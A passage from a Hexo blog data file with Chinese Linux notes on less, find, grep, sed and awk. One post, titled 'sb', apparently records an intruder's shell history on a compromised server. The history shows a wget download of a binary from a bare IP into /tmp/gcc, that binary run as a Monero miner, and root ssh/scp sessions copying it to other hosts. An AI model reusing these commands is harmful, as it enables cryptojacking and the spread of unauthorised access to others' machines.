lines).\n  y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).\n  f  ^F  ^V  SPACE  *  Forward  one window (or N lines).\n  b  ^B  ESC-v      *  Backward one window (or N lines).\n  z                 *  Forward  one window (and set window to N).\n  w                 *  Backward one window (and set window to N).\n  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.\n  d  ^D             *  Forward  one half-window (and set half-window to N).\n  u  ^U             *  Backward one half-window (and set half-window to N).\n  ESC-)  RightArrow *  Left  one half screen width (or N positions).\n  ESC-(  LeftArrow  *  Right one half screen width (or N positions).\n  F                    Forward forever; like \"tail -f\".\n  r  ^R  ^L            Repaint screen.\n  R                    Repaint screen, discarding buffered input.\n        ---------------------------------------------------\n        Default \"window\" is the screen height.\n        Default \"half-window\" is half of the screen height.\n```\n\n行数 |前进 |后退       \n---|---|--- |---\n一行或N行|e|y\n一页     |f|b \n半页     |d|u\n\n","source":"_posts/Linux/less用法.md","raw":"---\ntitle: less用法\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\nless --help\n```\n  e  ^E  j  ^N  CR  *  Forward  one line   (or N lines).\n  y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).\n  f  ^F  ^V  SPACE  *  Forward  one window (or N lines).\n  b  ^B  ESC-v      *  Backward one window (or N lines).\n  z                 *  Forward  one window (and set window to N).\n  w                 *  Backward one window (and set window to N).\n  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.\n  d  ^D             *  Forward  one half-window (and set half-window to N).\n  u  ^U             *  Backward one half-window (and set half-window to N).\n  ESC-)  RightArrow *  Left  one half screen width (or N positions).\n  ESC-(  LeftArrow  *  Right one half screen width (or N positions).\n  F                    Forward forever; like \"tail -f\".\n  r  ^R  ^L            Repaint screen.\n  R                    Repaint screen, discarding buffered input.\n        ---------------------------------------------------\n        Default \"window\" is the screen height.\n        Default \"half-window\" is half of the screen height.\n```\n\n行数 |前进 |后退       \n---|---|--- |---\n一行或N行|e|y\n一页     |f|b \n半页     |d|u\n\n","slug":"Linux/less用法","published":1,"updated":"2018-07-10T13:10:09.923Z","_id":"cjjedmha400400gtjxxanb2yd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>less –help<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e  ^E  j  ^N  CR  *  Forward  one line   (or N lines).</span><br><span class=\"line\">y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).</span><br><span class=\"line\">f  ^F  ^V  SPACE  *  Forward  one window (or N lines).</span><br><span class=\"line\">b  ^B  ESC-v      *  Backward one window (or N lines).</span><br><span class=\"line\">z                 *  Forward  one window (and set window to N).</span><br><span class=\"line\">w                 *  Backward one window (and set window to N).</span><br><span class=\"line\">ESC-SPACE         *  Forward  one window, but don&apos;t stop at end-of-file.</span><br><span class=\"line\">d  ^D             *  Forward  one half-window (and set half-window to N).</span><br><span class=\"line\">u  ^U             *  Backward one half-window (and set half-window to N).</span><br><span class=\"line\">ESC-)  RightArrow *  Left  one half screen width (or N positions).</span><br><span class=\"line\">ESC-(  LeftArrow  *  Right one half screen width (or N positions).</span><br><span class=\"line\">F                    Forward forever; like &quot;tail -f&quot;.</span><br><span class=\"line\">r  ^R  ^L            Repaint screen.</span><br><span class=\"line\">R                    Repaint screen, discarding buffered input.</span><br><span class=\"line\">      ---------------------------------------------------</span><br><span class=\"line\">      Default &quot;window&quot; is the screen height.</span><br><span class=\"line\">      Default &quot;half-window&quot; is half of the screen height.</span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th>行数</th>\n<th>前进</th>\n<th>后退       </th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>一行或N行</td>\n<td>e</td>\n<td>y</td>\n</tr>\n<tr>\n<td>一页</td>\n<td>f</td>\n<td>b </td>\n</tr>\n<tr>\n<td>半页</td>\n<td>d</td>\n<td>u</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<p>less –help<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e  ^E  j  ^N  CR  *  Forward  one line   (or N lines).</span><br><span class=\"line\">y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).</span><br><span class=\"line\">f  ^F  ^V  SPACE  *  Forward  one window (or N lines).</span><br><span class=\"line\">b  ^B  ESC-v      *  Backward one window (or N lines).</span><br><span class=\"line\">z                 *  Forward  one window (and set window to N).</span><br><span class=\"line\">w                 *  Backward one window (and set window to N).</span><br><span class=\"line\">ESC-SPACE         *  Forward  one window, but don&apos;t stop at end-of-file.</span><br><span class=\"line\">d  ^D             *  Forward  one half-window (and set half-window to N).</span><br><span class=\"line\">u  ^U             *  Backward one half-window (and set half-window to N).</span><br><span class=\"line\">ESC-)  RightArrow *  Left  one half screen width (or N positions).</span><br><span class=\"line\">ESC-(  LeftArrow  *  Right one half screen width (or N positions).</span><br><span class=\"line\">F                    Forward forever; like &quot;tail -f&quot;.</span><br><span class=\"line\">r  ^R  ^L            Repaint screen.</span><br><span class=\"line\">R                    Repaint screen, discarding buffered input.</span><br><span class=\"line\">      ---------------------------------------------------</span><br><span class=\"line\">      Default &quot;window&quot; is the screen height.</span><br><span class=\"line\">      Default &quot;half-window&quot; is half of the screen height.</span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th>行数</th>\n<th>前进</th>\n<th>后退       </th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>一行或N行</td>\n<td>e</td>\n<td>y</td>\n</tr>\n<tr>\n<td>一页</td>\n<td>f</td>\n<td>b </td>\n</tr>\n<tr>\n<td>半页</td>\n<td>d</td>\n<td>u</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"find","date":"2018-07-10T13:09:19.000Z","_content":"\r\n列出当前目录及子目录下所有文件和文件夹 \r\n\r\n    find . \r\n\r\n在/home目录下查找以.txt结尾的文件名 \r\n\r\n    find /home -name \"*.txt\" \r\n\r\n同上，但忽略大小写 \r\n\r\n    find /home -iname \"*.txt\"\r\n\r\n当前目录及子目录下查找所有以.txt和.pdf结尾的文件 \r\n\r\n    find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\) 或 find . -name \"*.txt\" -o -name \"*.pdf\" \r\n\r\n匹配文件路径或者文件 \r\n\r\n    find /usr/ -path \"*local*\" \r\n\r\n基于正则表达式匹配文件路径 \r\n\r\n    find . -regex \".*\\(\\.txt\\|\\.pdf\\)$\" \r\n\r\n同上，但忽略大小写 \r\n\r\n    find . -iregex \".*\\(\\.txt\\|\\.pdf\\)$\" \r\n\r\n否定参数 \r\n\r\n找出/home下不是以.txt结尾的文件 \r\n\r\n    find /home ! -name \"*.txt\" \r\n\r\n根据文件类型进行搜索 \r\n\r\n    find . -type 类型参数 \r\n\r\n类型参数列表： \r\n\r\nf 普通文件 \r\n\r\nl 符号连接 \r\n\r\nd 目录 \r\n\r\nc 字符设备 \r\n\r\nb 块设备 \r\n\r\ns 套接字 \r\n\r\np Fifo 基于目录深度搜索 \r\n\r\n向下最大深度限制为\r\n\r\n    3 find . -maxdepth 3 -type f \r\n\r\n搜索出深度距离当前目录至少2个子目录的所有文件 \r\n\r\n    find . -mindepth 2 -type f \r\n\r\n根据文件时间戳进行搜索 \r\n\r\n    find . -type f 时间戳 \r\n\r\nUNIX/Linux文件系统每个文件都有三种时间戳：\r\n\r\n访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。\r\n\r\n修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。\r\n\r\n变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\r\n\r\n搜索最近七天内被访问过的所有文件 \r\n\r\n    find . -type f -atime -7 \r\n\r\n搜索恰好在七天前被访问过的所有文件 \r\n\r\n    find . -type f -atime 7 \r\n\r\n搜索超过七天内被访问过的所有文件\r\n\r\n    ...\r\n    \r\n来自: http://man.linuxde.net/find","source":"_posts/Linux/find.md","raw":"---\ntitle: find\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n\r\n列出当前目录及子目录下所有文件和文件夹 \r\n\r\n    find . \r\n\r\n在/home目录下查找以.txt结尾的文件名 \r\n\r\n    find /home -name \"*.txt\" \r\n\r\n同上，但忽略大小写 \r\n\r\n    find /home -iname \"*.txt\"\r\n\r\n当前目录及子目录下查找所有以.txt和.pdf结尾的文件 \r\n\r\n    find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\) 或 find . -name \"*.txt\" -o -name \"*.pdf\" \r\n\r\n匹配文件路径或者文件 \r\n\r\n    find /usr/ -path \"*local*\" \r\n\r\n基于正则表达式匹配文件路径 \r\n\r\n    find . -regex \".*\\(\\.txt\\|\\.pdf\\)$\" \r\n\r\n同上，但忽略大小写 \r\n\r\n    find . -iregex \".*\\(\\.txt\\|\\.pdf\\)$\" \r\n\r\n否定参数 \r\n\r\n找出/home下不是以.txt结尾的文件 \r\n\r\n    find /home ! -name \"*.txt\" \r\n\r\n根据文件类型进行搜索 \r\n\r\n    find . -type 类型参数 \r\n\r\n类型参数列表： \r\n\r\nf 普通文件 \r\n\r\nl 符号连接 \r\n\r\nd 目录 \r\n\r\nc 字符设备 \r\n\r\nb 块设备 \r\n\r\ns 套接字 \r\n\r\np Fifo 基于目录深度搜索 \r\n\r\n向下最大深度限制为\r\n\r\n    3 find . -maxdepth 3 -type f \r\n\r\n搜索出深度距离当前目录至少2个子目录的所有文件 \r\n\r\n    find . -mindepth 2 -type f \r\n\r\n根据文件时间戳进行搜索 \r\n\r\n    find . -type f 时间戳 \r\n\r\nUNIX/Linux文件系统每个文件都有三种时间戳：\r\n\r\n访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。\r\n\r\n修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。\r\n\r\n变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\r\n\r\n搜索最近七天内被访问过的所有文件 \r\n\r\n    find . -type f -atime -7 \r\n\r\n搜索恰好在七天前被访问过的所有文件 \r\n\r\n    find . -type f -atime 7 \r\n\r\n搜索超过七天内被访问过的所有文件\r\n\r\n    ...\r\n    \r\n来自: http://man.linuxde.net/find","slug":"Linux/find","published":1,"updated":"2018-07-10T13:10:09.923Z","_id":"cjjedmhaa00430gtj6wbjdmdq","comments":1,"layout":"post","photos":[],"link":"","content":"<p>列出当前目录及子目录下所有文件和文件夹 </p>\n<pre><code>find . \n</code></pre><p>在/home目录下查找以.txt结尾的文件名 </p>\n<pre><code>find /home -name &quot;*.txt&quot; \n</code></pre><p>同上，但忽略大小写 </p>\n<pre><code>find /home -iname &quot;*.txt&quot;\n</code></pre><p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件 </p>\n<pre><code>find . \\( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \\) 或 find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \n</code></pre><p>匹配文件路径或者文件 </p>\n<pre><code>find /usr/ -path &quot;*local*&quot; \n</code></pre><p>基于正则表达式匹配文件路径 </p>\n<pre><code>find . -regex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; \n</code></pre><p>同上，但忽略大小写 </p>\n<pre><code>find . -iregex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; \n</code></pre><p>否定参数 </p>\n<p>找出/home下不是以.txt结尾的文件 </p>\n<pre><code>find /home ! -name &quot;*.txt&quot; \n</code></pre><p>根据文件类型进行搜索 </p>\n<pre><code>find . -type 类型参数 \n</code></pre><p>类型参数列表： </p>\n<p>f 普通文件 </p>\n<p>l 符号连接 </p>\n<p>d 目录 </p>\n<p>c 字符设备 </p>\n<p>b 块设备 </p>\n<p>s 套接字 </p>\n<p>p Fifo 基于目录深度搜索 </p>\n<p>向下最大深度限制为</p>\n<pre><code>3 find . -maxdepth 3 -type f \n</code></pre><p>搜索出深度距离当前目录至少2个子目录的所有文件 </p>\n<pre><code>find . -mindepth 2 -type f \n</code></pre><p>根据文件时间戳进行搜索 </p>\n<pre><code>find . -type f 时间戳 \n</code></pre><p>UNIX/Linux文件系统每个文件都有三种时间戳：</p>\n<p>访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。</p>\n<p>修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。</p>\n<p>变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。</p>\n<p>搜索最近七天内被访问过的所有文件 </p>\n<pre><code>find . -type f -atime -7 \n</code></pre><p>搜索恰好在七天前被访问过的所有文件 </p>\n<pre><code>find . -type f -atime 7 \n</code></pre><p>搜索超过七天内被访问过的所有文件</p>\n<pre><code>...\n</code></pre><p>来自: <a href=\"http://man.linuxde.net/find\" target=\"_blank\" rel=\"noopener\">http://man.linuxde.net/find</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>列出当前目录及子目录下所有文件和文件夹 </p>\n<pre><code>find . \n</code></pre><p>在/home目录下查找以.txt结尾的文件名 </p>\n<pre><code>find /home -name &quot;*.txt&quot; \n</code></pre><p>同上，但忽略大小写 </p>\n<pre><code>find /home -iname &quot;*.txt&quot;\n</code></pre><p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件 </p>\n<pre><code>find . \\( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \\) 或 find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \n</code></pre><p>匹配文件路径或者文件 </p>\n<pre><code>find /usr/ -path &quot;*local*&quot; \n</code></pre><p>基于正则表达式匹配文件路径 </p>\n<pre><code>find . -regex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; \n</code></pre><p>同上，但忽略大小写 </p>\n<pre><code>find . -iregex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; \n</code></pre><p>否定参数 </p>\n<p>找出/home下不是以.txt结尾的文件 </p>\n<pre><code>find /home ! -name &quot;*.txt&quot; \n</code></pre><p>根据文件类型进行搜索 </p>\n<pre><code>find . -type 类型参数 \n</code></pre><p>类型参数列表： </p>\n<p>f 普通文件 </p>\n<p>l 符号连接 </p>\n<p>d 目录 </p>\n<p>c 字符设备 </p>\n<p>b 块设备 </p>\n<p>s 套接字 </p>\n<p>p Fifo 基于目录深度搜索 </p>\n<p>向下最大深度限制为</p>\n<pre><code>3 find . -maxdepth 3 -type f \n</code></pre><p>搜索出深度距离当前目录至少2个子目录的所有文件 </p>\n<pre><code>find . -mindepth 2 -type f \n</code></pre><p>根据文件时间戳进行搜索 </p>\n<pre><code>find . -type f 时间戳 \n</code></pre><p>UNIX/Linux文件系统每个文件都有三种时间戳：</p>\n<p>访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。</p>\n<p>修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。</p>\n<p>变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。</p>\n<p>搜索最近七天内被访问过的所有文件 </p>\n<pre><code>find . -type f -atime -7 \n</code></pre><p>搜索恰好在七天前被访问过的所有文件 </p>\n<pre><code>find . -type f -atime 7 \n</code></pre><p>搜索超过七天内被访问过的所有文件</p>\n<pre><code>...\n</code></pre><p>来自: <a href=\"http://man.linuxde.net/find\" target=\"_blank\" rel=\"noopener\">http://man.linuxde.net/find</a></p>\n"},{"title":"awk;sed;grep;jq","date":"2018-07-10T13:09:19.000Z","_content":" grep 更适合单纯的查找或匹配文本    \r\n sed 更适合编辑匹配到的文本     \r\n awk 更适合格式化文本，对文本进行较复杂格式处理 \r\n \r\n sed    \r\n sed不支持正则非贪婪匹配（不支持？） \r\n \r\n g表示替换所有\r\n ```\r\n echo '!#$#$J#$##@B#@#' | sed -r 's/#//'\r\n!$#$J#$##@B#@#\r\n\r\necho '!#$#$J#$##@B#@#' | sed -r 's/#//g'\r\n!$$J$@B@\r\n```\r\nawk\r\n输出所有\r\n```\r\nawk -F\\| '{for(i=0;i<=NF;++i){res=res\"\\n\"$i} print res}'\r\n\r\necho '#26#false#0.0400#500000#|#24#false#0.0540#500000#|#23#false#0.0600#500000#|' | sed 's/false//g' | awk -F\\| '{for(i=0;i<=NF;++i){res=res\"\\n\"$i} print res}'\r\n\r\n#26##0.0400#500000#|#24##0.0540#500000#|#23##0.0600#500000#|\r\n#26##0.0400#500000#\r\n#24##0.0540#500000#\r\n#23##0.0600#500000#\r\n```","source":"_posts/Linux/awk;sed;grep;jq.md","raw":"---\ntitle: awk;sed;grep;jq\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n grep 更适合单纯的查找或匹配文本    \r\n sed 更适合编辑匹配到的文本     \r\n awk 更适合格式化文本，对文本进行较复杂格式处理 \r\n \r\n sed    \r\n sed不支持正则非贪婪匹配（不支持？） \r\n \r\n g表示替换所有\r\n ```\r\n echo '!#$#$J#$##@B#@#' | sed -r 's/#//'\r\n!$#$J#$##@B#@#\r\n\r\necho '!#$#$J#$##@B#@#' | sed -r 's/#//g'\r\n!$$J$@B@\r\n```\r\nawk\r\n输出所有\r\n```\r\nawk -F\\| '{for(i=0;i<=NF;++i){res=res\"\\n\"$i} print res}'\r\n\r\necho '#26#false#0.0400#500000#|#24#false#0.0540#500000#|#23#false#0.0600#500000#|' | sed 's/false//g' | awk -F\\| '{for(i=0;i<=NF;++i){res=res\"\\n\"$i} print res}'\r\n\r\n#26##0.0400#500000#|#24##0.0540#500000#|#23##0.0600#500000#|\r\n#26##0.0400#500000#\r\n#24##0.0540#500000#\r\n#23##0.0600#500000#\r\n```","slug":"Linux/awk;sed;grep;jq","published":1,"updated":"2018-07-10T13:10:09.922Z","_id":"cjjedmhab00440gtjc5hfxhds","comments":1,"layout":"post","photos":[],"link":"","content":"<p> grep 更适合单纯的查找或匹配文本<br> sed 更适合编辑匹配到的文本<br> awk 更适合格式化文本，对文本进行较复杂格式处理 </p>\n<p> sed<br> sed不支持正则非贪婪匹配（不支持？） </p>\n<p> g表示替换所有</p>\n<pre><code> echo &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//&apos;\n!$#$J#$##@B#@#\n\necho &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//g&apos;\n!$$J$@B@\n</code></pre><p>awk<br>输出所有</p>\n<pre><code>awk -F\\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\\n&quot;$i} print res}&apos;\n\necho &apos;#26#false#0.0400#500000#|#24#false#0.0540#500000#|#23#false#0.0600#500000#|&apos; | sed &apos;s/false//g&apos; | awk -F\\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\\n&quot;$i} print res}&apos;\n\n#26##0.0400#500000#|#24##0.0540#500000#|#23##0.0600#500000#|\n#26##0.0400#500000#\n#24##0.0540#500000#\n#23##0.0600#500000#\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p> grep 更适合单纯的查找或匹配文本<br> sed 更适合编辑匹配到的文本<br> awk 更适合格式化文本，对文本进行较复杂格式处理 </p>\n<p> sed<br> sed不支持正则非贪婪匹配（不支持？） </p>\n<p> g表示替换所有</p>\n<pre><code> echo &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//&apos;\n!$#$J#$##@B#@#\n\necho &apos;!#$#$J#$##@B#@#&apos; | sed -r &apos;s/#//g&apos;\n!$$J$@B@\n</code></pre><p>awk<br>输出所有</p>\n<pre><code>awk -F\\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\\n&quot;$i} print res}&apos;\n\necho &apos;#26#false#0.0400#500000#|#24#false#0.0540#500000#|#23#false#0.0600#500000#|&apos; | sed &apos;s/false//g&apos; | awk -F\\| &apos;{for(i=0;i&lt;=NF;++i){res=res&quot;\\n&quot;$i} print res}&apos;\n\n#26##0.0400#500000#|#24##0.0540#500000#|#23##0.0600#500000#|\n#26##0.0400#500000#\n#24##0.0540#500000#\n#23##0.0600#500000#\n</code></pre>"},{"title":"sb","date":"2018-07-10T13:09:19.000Z","_content":"```\n  you_wanna_fucking_login_motherfucker? \n   218.82.180.97    Thu Oct  5 05:50 - 06:59  (01:08)    \nroot     pts/0        123.206.13.151   Fri Sep 29 16:54 - 17:02  (00:07)    \nroot     pts/0        45.63.122.222\n   lscpu\n  473  cat /etc/issue\n  474  exit\n  475  chmod +x /tmp/gcc\n  476  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  477  top\n  478  ping baidu.com\n  479  ssh root@60.12.33.88\n  480  lscpu\n  481  top\n  482  /usr/bin/wget http://35.194.156.203/gcc -O /tmp/gcc \n  483  chmod +x /tmp/gcc\n  484  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  485  top\n  486  ping baidu.com\n  487  ping 3cac.com\n  488  top\n  489  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:2222 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  490  top\n  491  ssh root@141.137.149.141\n  492  ssh root\n  493  ssh root@139.129.47.28\n  494  ssh root@25.153.248.225\n  495  ssh root@121.43.148.191 -平2201\n  496  ssh root@121.43.148.191 -p 2201\n  497  ssh root@121.41.175.41\n  498  cd /tmp\n  499  ls\n  500  ssp gcc root@121.41.175.41:/tmp/\n  501  scp gcc root@121.41.175.41:/tmp/\n  502  cd /tmp\n  503  ssh root@121.41.175.41\n  504  ssh root@61.129.87.76 -p 2204\n  505  ssh root@54.223.83.133\n  506  ssh root@183.57.72.90 -p 2222\n  507  curl ip.cn\n  508  ls\n  509  scp gcc root@123.206.13.151:/tmp/\n  510  ssh root@123.206.13.151","source":"_posts/Linux/sb.md","raw":"---\ntitle: sb\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\n  you_wanna_fucking_login_motherfucker? \n   218.82.180.97    Thu Oct  5 05:50 - 06:59  (01:08)    \nroot     pts/0        123.206.13.151   Fri Sep 29 16:54 - 17:02  (00:07)    \nroot     pts/0        45.63.122.222\n   lscpu\n  473  cat /etc/issue\n  474  exit\n  475  chmod +x /tmp/gcc\n  476  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  477  top\n  478  ping baidu.com\n  479  ssh root@60.12.33.88\n  480  lscpu\n  481  top\n  482  /usr/bin/wget http://35.194.156.203/gcc -O /tmp/gcc \n  483  chmod +x /tmp/gcc\n  484  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  485  top\n  486  ping baidu.com\n  487  ping 3cac.com\n  488  top\n  489  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:2222 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &\n  490  top\n  491  ssh root@141.137.149.141\n  492  ssh root\n  493  ssh root@139.129.47.28\n  494  ssh root@25.153.248.225\n  495  ssh root@121.43.148.191 -平2201\n  496  ssh root@121.43.148.191 -p 2201\n  497  ssh root@121.41.175.41\n  498  cd /tmp\n  499  ls\n  500  ssp gcc root@121.41.175.41:/tmp/\n  501  scp gcc root@121.41.175.41:/tmp/\n  502  cd /tmp\n  503  ssh root@121.41.175.41\n  504  ssh root@61.129.87.76 -p 2204\n  505  ssh root@54.223.83.133\n  506  ssh root@183.57.72.90 -p 2222\n  507  curl ip.cn\n  508  ls\n  509  scp gcc root@123.206.13.151:/tmp/\n  510  ssh root@123.206.13.151","slug":"Linux/sb","published":1,"updated":"2018-07-10T13:10:09.926Z","_id":"cjjedmhac00470gtjjz51v96v","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>  you_wanna_fucking_login_motherfucker?<br>   218.82.180.97    Thu Oct  5 05:50 - 06:59  (01:08)<br>root     pts/0        123.206.13.151   Fri Sep 29 16:54 - 17:02  (00:07)<br>root     pts/0        45.63.122.222<br>   lscpu<br>  473  cat /etc/issue<br>  474  exit<br>  475  chmod +x /tmp/gcc<br>  476  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  477  top<br>  478  ping baidu.com<br>  479  ssh <a href=\"mailto:root@60.12.33.88\" target=\"_blank\" rel=\"noopener\">root@60.12.33.88</a><br>  480  lscpu<br>  481  top<br>  482  /usr/bin/wget <a href=\"http://35.194.156.203/gcc\" target=\"_blank\" rel=\"noopener\">http://35.194.156.203/gcc</a> -O /tmp/gcc<br>  483  chmod +x /tmp/gcc<br>  484  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  485  top<br>  486  ping baidu.com<br>  487  ping 3cac.com<br>  488  top<br>  489  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:2222 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  490  top<br>  491  ssh <a href=\"mailto:root@141.137.149.141\" target=\"_blank\" rel=\"noopener\">root@141.137.149.141</a><br>  492  ssh root<br>  493  ssh <a href=\"mailto:root@139.129.47.28\" target=\"_blank\" rel=\"noopener\">root@139.129.47.28</a><br>  494  ssh <a href=\"mailto:root@25.153.248.225\" target=\"_blank\" rel=\"noopener\">root@25.153.248.225</a><br>  495  ssh <a href=\"mailto:root@121.43.148.191\" target=\"_blank\" rel=\"noopener\">root@121.43.148.191</a> -平2201<br>  496  ssh <a href=\"mailto:root@121.43.148.191\" target=\"_blank\" rel=\"noopener\">root@121.43.148.191</a> -p 2201<br>  497  ssh <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a><br>  498  cd /tmp<br>  499  ls<br>  500  ssp gcc <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a>:/tmp/<br>  501  scp gcc <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a>:/tmp/<br>  502  cd /tmp<br>  503  ssh <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a><br>  504  ssh <a href=\"mailto:root@61.129.87.76\" target=\"_blank\" rel=\"noopener\">root@61.129.87.76</a> -p 2204<br>  505  ssh <a href=\"mailto:root@54.223.83.133\" target=\"_blank\" rel=\"noopener\">root@54.223.83.133</a><br>  506  ssh <a href=\"mailto:root@183.57.72.90\" target=\"_blank\" rel=\"noopener\">root@183.57.72.90</a> -p 2222<br>  507  curl ip.cn<br>  508  ls<br>  509  scp gcc <a href=\"mailto:root@123.206.13.151\" target=\"_blank\" rel=\"noopener\">root@123.206.13.151</a>:/tmp/<br>  510  ssh <a href=\"mailto:root@123.206.13.151\" target=\"_blank\" rel=\"noopener\">root@123.206.13.151</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>  you_wanna_fucking_login_motherfucker?<br>   218.82.180.97    Thu Oct  5 05:50 - 06:59  (01:08)<br>root     pts/0        123.206.13.151   Fri Sep 29 16:54 - 17:02  (00:07)<br>root     pts/0        45.63.122.222<br>   lscpu<br>  473  cat /etc/issue<br>  474  exit<br>  475  chmod +x /tmp/gcc<br>  476  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  477  top<br>  478  ping 